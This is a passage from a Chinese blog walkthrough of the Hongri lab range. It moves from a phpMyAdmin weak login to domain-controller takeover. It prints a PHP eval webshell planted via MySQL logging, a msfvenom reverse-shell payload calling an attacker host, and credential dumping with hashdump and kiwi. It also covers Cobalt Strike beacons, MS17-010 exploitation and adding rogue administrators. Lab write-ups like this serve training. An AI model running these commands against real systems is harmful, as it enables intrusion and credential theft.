class="line">#访问发现80端口是php探针</span><br><span class="line">#得到了探针的绝对路径 C：/phpst2016/WWW/l.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/php%E6%8E%A2%E9%92%88-20231108124630-5z3tf6e.png" alt="php探针">​</p><p>‍</p><h4 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.17</span><br><span class="line">#出了一些有用信息</span><br><span class="line">#phpMyadmin，phpinfo.php，l.php，</span><br></pre></td></tr></table></figure><p>​<img src="/assets/dirsearch-20231108124646-6khj2vm.png" alt="dirsearch"></p><h4 id="访问phpMyadmin"><a href="#访问phpMyadmin" class="headerlink" title="访问phpMyadmin"></a>访问phpMyadmin</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#发现是一个后台界面</span><br><span class="line">#直接弱口令登录成功</span><br><span class="line">root root</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86-20231108124913-qzbjp5y.png" alt="后台登陆">​</p><h4 id="弱口令登录成功"><a href="#弱口令登录成功" class="headerlink" title="弱口令登录成功"></a>弱口令登录成功</h4><p>​<img src="/assets/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95-20231108125036-t2su0pu.png" alt="弱口令登录">​</p><h4 id="拿到webshell"><a href="#拿到webshell" class="headerlink" title="拿到webshell"></a>拿到webshell</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#通过日志文件写入一句话来获取webshell：</span><br><span class="line">#写入webshell-网站根目录下shell,把日志log改为php</span><br><span class="line">SET global general_log = &#x27;ON&#x27;</span><br><span class="line">SET global general_log_file= &#x27;C:/phpst2016/WWW/shell.php&#x27;</span><br><span class="line">select &quot;<span class="meta">&lt;?php eval($_POST[&#x27;111&#x27;]);?&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%94%B9-20231108125207-didoz7l.png" alt="改">​​​</p><p>​<img src="/assets/%E6%94%B92-20231108125207-1d7c8nd.png" alt="改2">​</p><p>​​<img src="/assets/%E4%B8%8A%E5%B0%8F%E9%A9%AC-20231108125302-7jvh9d9.png" alt="上小马">​​​​</p><h4 id="蚁剑连接shell-php"><a href="#蚁剑连接shell-php" class="headerlink" title="蚁剑连接shell.php"></a>蚁剑连接shell.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#打开蚁剑</span><br><span class="line">#新建连接</span><br><span class="line">#输入URL：http://192.168.43.17/shell.php</span><br><span class="line">#输入密码：111</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5%E6%88%90%E5%8A%9F-20231108125418-6hb04x9.png" alt="蚁剑链接成功">​</p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#发现目标存在yxcms，尝试访问</span><br><span class="line">#在首页发现了后台地址和管理员账密</span><br></pre></td></tr></table></figure><p>​![YXCMS (2)](assets&#x2F;YXCMS 2-20231108125832-qjzn04w.png)​</p><p>​<img src="/assets/YXCMS-20231108125841-py8fplq.png" alt="YXCMS">​</p><h4 id="进入yxcms后台"><a href="#进入yxcms后台" class="headerlink" title="进入yxcms后台"></a>进入yxcms后台</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#网址输入：http://192.168.43.17/yxcms/index.php?r=admin</span><br><span class="line">#admin </span><br><span class="line">#123456</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0-20231108130129-fx2aroz.png" alt="进入后台">​</p><h4 id="利用文件上传"><a href="#利用文件上传" class="headerlink" title="利用文件上传"></a>利用文件上传</h4><p>​<img src="/assets/CMS%E9%A9%AC%E5%AD%90-20231108130339-1md5n1o.png" alt="CMS马子">​</p><h4 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#小提一下，马子上传了，不知道马子绝对路径怎么办？</span><br><span class="line">#前面我们不是发现phpstudy文件夹下存在beifen.rar</span><br><span class="line">#猜测应该是yxcms的备份文件</span><br><span class="line">#解压之后，可通过查找acomment.php文件来确定文件上传的路径</span><br><span class="line">#/yxcms/protected/apps/default/view/default</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/%E5%90%8E%E5%8F%B0%E6%A8%A1%E6%9D%BF%E4%B8%8A%E9%A9%AC%E5%AD%90-20231108130559-655iw0x.png" alt="后台模板上马子"><br>​<img src="/assets/%E9%A9%AC%E5%AD%90%E8%B7%AF%E5%BE%84-20231108130558-7k8qslr.png" alt="马子路径"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#URl:http://192.168.43.17/yxcms/protected/apps/default/view/default/cmsshell.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5CMS%E9%A9%AC%E5%AD%90-20231108130418-wlgpkdo.png" alt="蚁剑链接CMS马子">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">至此，已经拿到Webshell</span><br></pre></td></tr></table></figure><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透阶段，当我们已经将小马上传到web服务器上时，可以用webshell管理工具进行下一步渗透了。</p><h3 id="蚁剑终端关闭win7防火墙"><a href="#蚁剑终端关闭win7防火墙" class="headerlink" title="蚁剑终端关闭win7防火墙"></a>蚁剑终端关闭win7防火墙</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#关闭win防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">#查看防火墙配置状态</span><br><span class="line">netsh advfirewall show allprofile state </span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E5%85%B3%E9%97%ADwin7%E9%98%B2%E7%81%AB%E5%A2%99-20231108131344-jkiym04.png" alt="蚁剑关闭win7防火墙">​</p><p>​<img src="/assets/win%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%ADkali%E6%9C%BAPing%E9%80%9A-20231108131352-ujgflvh.png" alt="win防火墙关闭kali机Ping通">​</p><h3 id="msf生成exe并开启监听"><a href="#msf生成exe并开启监听" class="headerlink" title="msf生成exe并开启监听"></a>msf生成exe并开启监听</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#kali创建后门程序</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.43.33 LPORT=10888 -f exe -o 233.exe </span><br><span class="line"></span><br><span class="line">#蚁剑上传233.exe</span><br><span class="line">#蚁剑终端运行233.exe</span><br><span class="line"></span><br><span class="line">#kali开启监听，设置sessions</span><br><span class="line">use exp/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp </span><br><span class="line">set lhost 192.168.43.33</span><br><span class="line">set lport 10888</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/233-20231108131821-bkf4y4q.png" alt="233">​</p><p><img src="/assets/msf%E7%94%9F%E6%88%90%E9%A9%AC%E5%AD%90%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BF-20231108131514-7njizs6.png" alt="msf生成马子监听上线"></p><h3 id="拿到win7shell"><a href="#拿到win7shell" class="headerlink" title="拿到win7shell"></a>拿到win7shell</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#尝试提权   </span><br><span class="line">#因为是administrator用户，</span><br><span class="line">#所以很容易提权成功。</span><br><span class="line">shell</span><br><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%AE%80%E5%8D%95%E6%8F%90%E6%9D%83sys32-20231108132027-acolb2r.png" alt="简单提权sys32">​</p><h3 id="利用msf进行内网信息收集"><a href="#利用msf进行内网信息收集" class="headerlink" title="利用msf进行内网信息收集"></a>利用msf进行内网信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001         ---可解决乱码问题</span><br><span class="line">route print        ---锁定内网C段</span><br><span class="line">net time /domain   ---锁定域控192.168.52.138</span><br><span class="line">net user /domain   ---锁定域内五个账户</span><br><span class="line">ipconfig /all      ---锁定域名</span><br><span class="line">net view           ---锁定域内主机</span><br><span class="line">net group &quot;domain admins&quot; /domain     ---查询域管理员</span><br><span class="line"></span><br><span class="line">------------</span><br><span class="line">域名：god.org</span><br><span class="line">域内五个用户：Administrator、Guest、liukaifeng01、ligang、krbtgt</span><br><span class="line">域内三台主机：OWA（win2k8）、ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)</span><br><span class="line">域控：OWA(192.168.52.138)</span><br><span class="line">win7内网ip：192.168.52.143</span><br><span class="line">------------</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MSFping%E5%9F%9F%E6%8E%A7-20231108132218-3nyd9no.png" alt="MSFping域控"></p><p>​<img src="/assets/MSF%E9%94%81%E5%AE%9A%E5%9F%9F%E5%86%85%E6%88%90%E5%91%98%E4%BA%94%E4%B8%AA-20231108132242-whkn6m9.png" alt="MSF锁定域内成员五个"></p><p>​<img src="/assets/%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA-20231108132253-8wmtt46.png" alt="查询域内其他主机"></p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump    ---导出本地用户账号密码，该命令的使用需要系统权限。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/hashdump-20231108133027-38fext2.png" alt="hashdump">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#CMD5解密</span><br><span class="line">---#hash解密为空：</span><br><span class="line">---#因为当系统为win10或2012R2以上时，</span><br><span class="line">---#默认在内存缓存中禁止保存明文密码，密码字段显示为null，</span><br><span class="line">---#需要修改注册表等用户重新登录后才能成功抓取。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CMD5hash%E8%A7%A3%E5%AF%86-20231108133104-en27ea2.png" alt="CMD5hash解密"></p><h3 id="抓取域内账密"><a href="#抓取域内账密" class="headerlink" title="抓取域内账密"></a>抓取域内账密</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用msf的kiwi模块+system权限</span><br><span class="line">load kiwi         #加载kiwi模块</span><br><span class="line">help kiwi         #查看kiwi模块的使用</span><br><span class="line">creds_all         #列举所有凭据</span><br><span class="line">creds_kerberos    #列举域内账密 Administrator  admin@123</span><br></pre></td></tr></table></figure><p>​![load kiwi+creds_all](assets&#x2F;load kiwi+creds_all-20231108133200-gn82sit.png)​</p><p>​<img src="/assets/creds_kerberos-20231108133211-anzuniq.png" alt="creds_kerberos">​</p><h3 id="CS上线win7"><a href="#CS上线win7" class="headerlink" title="CS上线win7"></a>CS上线win7</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#楼楼用的是tools的CS</span><br><span class="line">#CS的基本使用楼楼就不做多说明了</span><br><span class="line">#kali机作为服务端，本地win11为客户端</span><br><span class="line">#服务端启动</span><br><span class="line">./teamserver  192.168.43.33 123456 </span><br><span class="line"># 这里的ip是服务端ip，后续客户端连接此ip登录</span><br><span class="line">win11:</span><br><span class="line">直接运行runcatcs.vbs即可（仅限windows），</span><br><span class="line">其他系统执行：java -jar cat_client.jar client</span><br><span class="line"></span><br><span class="line">#设置监听器</span><br><span class="line">#生成木马--&gt;artifactHRmsf.exe</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CS%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC-20231108133648-r9v8i2v.png" alt="CS生成木马">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#蚁剑上传artfactHRmsf.exe到win7</span><br><span class="line">#运行木马程序</span><br><span class="line">#CS上线成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC-20231108134053-f4xzd6n.png" alt="蚁剑上传木马">​</p><p>​<img src="/assets/CS%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F-20231108134100-bg3hmpb.png" alt="CS上线成功"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#简单提权</span><br><span class="line">elevate   ---#提权成功</span><br><span class="line">sleep 1  ---#设置回弹时间间隔</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CS%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9Fsystem-20231108134147-5lze012.png" alt="CS提权成功system">​</p><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>为了让 msf 能访问内网的其他主机，即 52 网段的攻击流量都通过已渗透的这台目标主机（Win7）的meterpreter会话来传递，需要建立socks反向代理。</p><h3 id="socket代理"><a href="#socket代理" class="headerlink" title="socket代理"></a>socket代理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#添加代理</span><br><span class="line">run autoroute -s 192.168.52.0/24  # 添加内网的路由</span><br><span class="line">run autoroute -p                  # 查看路由</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1+%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86-20231108134918-ctqeond.png" alt="添加路由+挂上代理"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启代理</span><br><span class="line">background   #将此会话保存为一个sessions</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set VERSION 4a</span><br><span class="line">set SRVPORT 9080</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">run</span><br><span class="line">jobs    #运行后挂起一个job</span><br></pre></td></tr></table></figure><p>​<img src="/assets/4a%E4%BB%A3%E7%90%86-20231108134933-aee098e.png" alt="4a代理">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#修改配置文件</span><br><span class="line">#在proxychains的配置文件</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">#添加本机的1080端口：</span><br><span class="line">socks4 127.0.0.1 1080</span><br><span class="line">#ping 域内成员</span><br></pre></td></tr></table></figure><p>​<img src="/assets/1080-20231108135250-okzbhlp.png" alt="1080">​</p><p>​<img src="/assets/proxychains%E9%80%9A-20231108135256-wgbzrxd.png" alt="proxychains通">​</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用nmap对域内主机进行漏洞扫描</span><br><span class="line">nmap --script=vuln 192.168.52.141</span><br><span class="line">nmap --script=vuln 192.168.52.143</span><br><span class="line">nmap --script=vuln 192.168.52.138</span><br><span class="line">#发现都存在ms17_010漏洞</span><br></pre></td></tr></table></figure><p>​<img src="/assets/nmap+win2k8+win7-20231108140357-x2wdc7i.png" alt="nmap+win2k8+win7">​</p><p>​<img src="/assets/nmap%E6%89%AB%E6%8F%8Fwin2k3-20231108140357-vtjpnio.png" alt="nmap扫描win2k3">​</p><p>​<img src="/assets/win7+msf17-010-20231108140357-6w26su3.png" alt="win7+msf17-010"></p><h3 id="msf利用ms17-010"><a href="#msf利用ms17-010" class="headerlink" title="msf利用ms17-010"></a>msf利用ms17-010</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 2</span><br><span class="line">set RHOST 192.168.52.141/143/138</span><br><span class="line">set COMMAND net user</span><br><span class="line">run</span><br><span class="line">#发现除了win7。win2k3,win2k8都可以利用成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/138+ms17+rce%E6%88%90%E5%8A%9F-20231108140718-hxtrtdc.png" alt="138+ms17+rce成功">​</p><p>​<img src="/assets/141+ms17+rce%E6%88%90%E5%8A%9F-20231108140718-9zh0we5.png" alt="141+ms17+rce成功">​</p><p>​<img src="/assets/143+win7+%E5%A4%B1%E8%B4%A5-20231108140718-svyszq1.png" alt="143+win7+失败">​</p><h3 id="尝试给域控win2k8添加管理员"><a href="#尝试给域控win2k8添加管理员" class="headerlink" title="尝试给域控win2k8添加管理员"></a>尝试给域控win2k8添加管理员</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#添加管理员</span><br><span class="line">set  COMMAND net user awy233 awy@233 /add</span><br><span class="line">set COMMAND net user</span><br><span class="line">set COMMAND net localgroup administrators awy233 awy@233 /add</span><br><span class="line">set COMMAND net localgroup administrators</span><br><span class="line">#添加成功，但3389毫无反应</span><br></pre></td></tr></table></figure><p>​<img src="/assets/138+%E6%B7%BB%E5%8A%A0awy233%E6%88%90%E5%8A%9F-20231108141028-8dh2qq9.png" alt="138+添加awy233成功">​</p><p>​<img src="/assets/138+%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98+%E6%88%90%E5%8A%9F-20231108141045-ath15ny.png" alt="138+添加管理员+成功">​</p><p>​<img src="/assets/138+%E6%88%90%E5%8A%9F%E6%88%AA%E5%9B%BE%E2%86%90-20231108141045-k9wkw38.png" alt="138+成功截图←">​</p><h3 id="尝试开启域控3389端口"><a href="#尝试开启域控3389端口" class="headerlink" title="尝试开启域控3389端口"></a>尝试开启域控3389端口</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#关闭防火墙</span><br><span class="line">set COMMAND netsh advfirewall set allprofiles state off </span><br><span class="line">#3389</span><br><span class="line">set COMMAND wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line">set COMMAND REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">#登不上，不知道为什么</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-11-08 141233](assets&#x2F;屏幕截图 2023-11-08 141233-20231108141247-33xzu1g.png)​</p><h2 id="利用SMB-Beacon拿下域控"><a href="#利用SMB-Beacon拿下域控" class="headerlink" title="利用SMB Beacon拿下域控"></a>利用SMB Beacon拿下域控</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#使用条件：</span><br><span class="line">#具有 Beacon 的主机必须接受 445 端口上的连接。</span><br><span class="line">#只能链接由同一个 Cobalt Strike 实例管理的 Beacon。</span><br><span class="line">#必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</span><br><span class="line"></span><br><span class="line">#新建监听器</span><br><span class="line">#payload选择Beacon SMB</span><br><span class="line"></span><br><span class="line">#右键域控，选择psexec攻击</span><br><span class="line">#设置参数</span><br><span class="line"></span><br><span class="line">#成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/SMB%E7%9B%91%E5%90%AC-20231108142350-jpfr850.png" alt="SMB监听">​</p><p>​<img src="/assets/%E9%80%89%E6%8B%A9%E5%9F%9F%E6%8E%A7-20231108142354-d121qu8.png" alt="选择域控">​</p><p>​![屏幕截图 2023-11-08 142244](assets&#x2F;屏幕截图 2023-11-08 142244-20231108142358-dpyzs40.png)​</p><p><img src="/assets/SMB%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F-20231108141835-6lfg4su.png" alt="SMB攻击成功">​<img src="/assets/%E5%85%A8%E9%83%A8%E6%8B%BF%E4%B8%8B-20231108141846-w91phsf.png" alt="全部拿下">​​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
